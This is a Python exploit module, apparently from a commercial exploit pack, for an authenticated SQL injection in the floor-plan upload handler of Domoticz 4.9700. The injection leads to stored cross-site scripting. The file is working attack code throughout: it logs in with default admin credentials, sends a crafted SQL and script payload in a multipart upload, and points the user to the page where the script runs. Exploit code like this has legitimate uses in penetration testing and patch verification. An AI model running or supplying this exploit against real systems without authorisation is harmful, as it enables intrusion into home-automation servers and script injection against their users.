from Sploit import Sploit
from collections import OrderedDict
import urllib2
from WebHelper import FormPoster
from base64 import b64encode
import cookielib
import hashlib

INFO = {}
INFO['NAME'] = "efs_domoticz_4_9700_sqli"
INFO['DESCRIPTION'] = "Domoticz 4.9700 SQL Injection/XSS"
INFO['VENDOR'] = "https://www.domoticz.com/"
INFO['CVE Name'] = ""
INFO['NOTES'] = """The specific flaw lies within CWebServer::UploadFloorplanImage method of WebServer.cpp.
m_sql.safe_query("INSERT INTO Floorplans ([Name],[ScaleFactor]) VALUES('%s','%s')", planname.c_str(),scalefactor.c_str());
Insufficient input validation results in SQL injection into VALUES arguments which in turn allows XSS on /#/Floorplanedit page.

Authorization is required, if it is enabled. Level: admin.
Tested on Windows 7 x64, Domoticz 4.9700.
"""
INFO['DOWNLOAD_LINK'] = "https://www.domoticz.com/downloads/"
INFO['LINKS'] = [""]
INFO['CHANGELOG'] = ""
INFO['PATH'] = "Exploits/"
INFO['AUTHOR'] = "04 Apr 2019, Gleg Team"

OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.217", dict(description='Target host')
OPTIONS["PORT"] = 8081, dict(description='Target port')
OPTIONS["BASEPATH"] = '/'
OPTIONS["SQL"] = "floor<script>alert(\"xss\");</script>', sqlite_version())--", dict(description='SQL query to inject. Stacked querires are not supported.')
OPTIONS["LOGIN"] = 'admin', dict(description='Login. Leave empty if authorization is not required.')
OPTIONS["PASSWORD"] = 'admin', dict(description='Password')


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

        self.host = '127.0.0.1'
        self.port = 8080
        self.basepath = '/'
        self.protocol = 'http'
        self.sql = "floor<script>alert(\"xss\");</script>', sqlite_version())--"
        self.login = ''
        self.password = ''

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", self.host)
        self.port = self.args.get("PORT", self.port)
        self.basepath = self.args.get("BASEPATH", self.basepath)
        self.sql = self.args.get("SQL", self.sql)
        self.login = self.args.get("LOGIN", self.login)
        self.password = self.args.get("PASSWORD", self.password)

        self.protocol = 'https' if self.check_ssl() else 'http'

        urllib2.install_opener(
            urllib2.build_opener(
                urllib2.HTTPCookieProcessor(
                    cookielib.CookieJar()
                )
            )
        )


    def check_ssl(self):
        self.log('[*] Checking if server uses HTTPS...')
        url = 'https://{}:{}/{}/login.htm'.format(self.host, self.port, self.basepath)

        try:
            urllib2.urlopen(url)
            self.log('[*] Server uses HTTPS')
            return True
        except urllib2.URLError as ex:
            pass
        
        self.log('[*] Server uses HTTP')
        return 

    def authorize(self):
        if not self.login:
            return

        self.login = b64encode(self.login).replace('=', '%3d')
        m = hashlib.md5()
        m.update(self.password)
        self.password = m.hexdigest()

        url = self.make_url('/json.htm?type=command&param=logincheck&username={}&password={}&rememberme=true'.format(self.login, self.password))
        try:
            r = urllib2.urlopen(url).read()
        except:
            self.log('[-] Failed to authorize')
            self.finish(False)


    def inject_sql(self):
        url = self.make_url('/uploadfloorplanimage.webem'.format(self.protocol, self.host, self.port, self.basepath))
        form = FormPoster()
        form.add_field('planname', self.sql)
        form.add_field('scalefactor', '1.0')
        form.add_file('imagefile', '', '', False)

        req = form.post(url)
        try:
            resp = urllib2.urlopen(req).read()
        except Exception as ex:
            self.log('[-] Request failed')
            self.log(ex)
            self.finish(False)

    def make_url(self, url):
        return '{}://{}:{}{}{}'.format(self.protocol, self.host, self.port, self.basepath, url.strip('/\\'))

    def run(self):
        self.args()
        self.authorize()
        self.inject_sql()
        self.log('[*] Done. Visit {} '.format(self.make_url('/#/Floorplanedit')))
        self.finish(True)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()